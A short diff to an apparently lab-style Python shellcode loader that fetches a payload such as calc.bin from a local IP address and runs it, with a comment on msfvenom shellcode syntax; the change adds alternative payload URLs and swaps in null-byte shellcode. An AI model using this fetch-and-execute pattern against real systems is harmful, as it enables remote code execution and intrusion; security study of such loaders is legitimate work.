@@ -6,6 +6,8 @@ import threading
 
 # URL = 'http://192.168.1.145/mspaint.bin'
 URL = 'http://192.168.1.145/calc.bin'
+# URL = 'http://192.168.1.145/messageBox.bin'
+# URL = 'http://192.168.1.145/empty.bin'
 
 #? Proper syntax for shellcode creation in msfvenom for a 64 bit system is:
 
@@ -113,7 +115,7 @@ if __name__ == '__main__':
     shellcode = get_code(URL)
 
     # print(shellcode)
-    # shellcode = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    shellcode = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
 
     try:
         run(shellcode)
